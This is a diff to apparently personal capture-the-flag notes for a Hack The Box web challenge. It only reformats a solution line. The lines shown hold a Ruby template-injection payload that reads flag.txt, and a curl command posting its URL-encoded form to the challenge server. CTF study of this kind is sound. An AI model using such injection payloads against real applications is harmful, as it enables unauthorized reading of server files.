@@ -21,7 +21,7 @@
  - Hint: Encode With url Encoding.
 	 - <%= File.open('flag.txt').read %> # Read file
  -  Solution: 
-	 - `curl 159.65.20.166:32127 \ -s -X POST -d 'neon=a %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' | grep -Eo 'HTB{.*}'`
+	 - ```curl 159.65.20.166:32127 \ -s -X POST -d 'neon=a %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' | grep -Eo 'HTB{.*}'```
  -  Explanation: https://drt.sh/posts/htb-neonify/
 
              
